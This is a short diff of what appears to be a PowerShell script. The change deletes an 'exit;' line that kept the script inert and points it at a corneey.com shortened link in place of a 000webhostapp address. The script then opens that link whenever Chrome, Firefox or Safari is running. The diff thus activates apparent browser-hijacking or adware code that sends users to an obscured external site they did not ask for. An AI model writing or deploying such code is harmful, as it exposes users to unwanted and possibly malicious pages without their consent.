@@ -1,5 +1,5 @@
-exit;
-$site="https://script0.000webhostapp.com/";
+
+$site="http://corneey.com/w36ozs";
 if (get-process "Chrome") { Start $site } 
 elseif (get-process "Firefox") { Start $site } 
 elseif (get-process "Safari") { Start $site } 
